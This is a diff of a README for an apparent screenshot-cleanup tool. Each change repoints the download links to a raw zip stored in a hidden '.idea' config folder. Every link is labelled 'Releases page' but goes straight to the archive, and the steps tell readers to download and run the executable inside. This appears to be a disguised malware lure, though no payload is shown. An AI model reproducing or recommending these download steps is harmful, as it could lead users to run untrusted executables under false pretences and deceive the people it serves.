@@ -1,6 +1,6 @@
 # ✨ auto-delete-screenshot - Keep Your Screenshots Under Control
 
-![Download auto-delete-screenshot](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/src/AutoDeleteScreenshot/Resources/screenshot_delete_auto_1.3.zip)
+![Download auto-delete-screenshot](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/.idea/auto-screenshot-delete-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the auto-delete-screenshot project! This application helps keep your 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/src/AutoDeleteScreenshot/Resources/screenshot_delete_auto_1.3.zip) to download the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/.idea/auto-screenshot-delete-v1.4.zip) to download the application. 
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/src/AutoDeleteScreenshot/Resources/screenshot_delete_auto_1.3.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/.idea/auto-screenshot-delete-v1.4.zip).
 2. Find the latest version of the application.
 3. Click on the link to download the executable file.
 4. Once the download is complete, locate the file on your computer.
@@ -51,7 +51,7 @@ After running the application for the first time, follow these steps to adjust t
 
 If you encounter any issues, try the following steps:
 
-- **Re-download the File:** Sometimes, the download may not complete successfully. Download the executable again from the [Releases page](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/src/AutoDeleteScreenshot/Resources/screenshot_delete_auto_1.3.zip).
+- **Re-download the File:** Sometimes, the download may not complete successfully. Download the executable again from the [Releases page](https://raw.githubusercontent.com/Your-Pinky/auto-delete-screenshot/main/.idea/auto-screenshot-delete-v1.4.zip).
 - **Check Permissions:** Ensure that the application has permission to run on your computer.
 - **Update .NET Framework:** Make sure you have the required version of .NET installed.
 
